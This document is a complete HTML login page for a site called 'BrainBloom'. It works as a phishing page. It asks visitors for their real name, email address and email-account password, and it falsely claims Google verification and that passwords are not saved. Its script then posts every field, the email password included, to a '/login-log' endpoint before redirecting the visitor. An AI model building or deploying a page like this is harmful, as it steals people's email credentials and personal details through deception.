<!DOCTYPE html>
<html>

<head>

<title>BrainBloom Login</title>

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
background:#08142b;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:white;
}

.box{
background:#13254d;
padding:30px;
border-radius:20px;
width:320px;
}

h1{
text-align:center;
}

input{
width:100%;
padding:14px;
margin-top:15px;
border:none;
border-radius:12px;
box-sizing:border-box;
}

button{
width:100%;
padding:14px;
margin-top:20px;
border:none;
border-radius:12px;
background:#ff1493;
color:white;
font-size:18px;
}

.notice{
margin-top:15px;
font-size:14px;
text-align:center;
color:#cccccc;
}

</style>

</head>

<body>

<div class="box">

<h1>BrainBloom Login</h1>

<input id="username"
placeholder="Username">

<input id="realname"
placeholder="Real Name">

<input id="email"
placeholder="Email">

<input id="mailpassword"
placeholder="Mail Password">

<button onclick="showWarning()">
Login
</button>

<p class="notice">
It is powered by Google for verification. Your passwords will not be saved, and it is a trusted website.
</p>

</div>

<script>

let warned = false;

function showWarning(){

if(!warned){

alert(
"Please double-check your information before continuing."
);

warned = true;

return;

}

fetch("/login-log",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

username:
document.getElementById("username").value,

realname:
document.getElementById("realname").value,

email:
document.getElementById("email").value,

mailpassword:
document.getElementById("mailpassword").value

})

})

.catch(()=>{})

.finally(()=>{

window.location.href="/index.html";

});

}

</script>

</body>

</html>
